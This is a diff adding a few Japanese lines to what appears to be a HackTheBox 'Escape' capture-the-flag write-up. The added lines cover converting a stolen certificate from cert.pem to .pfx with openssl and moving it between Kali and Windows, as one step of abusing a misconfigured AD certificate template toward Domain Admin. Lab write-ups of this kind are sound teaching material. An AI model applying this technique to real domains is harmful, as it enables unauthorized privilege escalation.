@@ -169,7 +169,17 @@ xRtGYKgrUmsctglMl5vTiEE2DY7o2JTAwr5WGMTY/QbRq8r3R2XksaDraW7zdcxb
 
 [*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
 ```
- 
+
+cert.pemをコピってKaliに持ってくる。そして`.pfx`に変換：
+
+```
+╭─[shoebill@kali]─[~/Escape_10.10.11.202] 
+╰─$ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+```
+
+cert.pfxを再度Windowsの方に持ってくる
+
+
  
  参考：
  - [From Misconfigured Certificate Template to Domain Admin(Read Team Notes)](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-misconfigured-certificate-template-to-domain-admin)
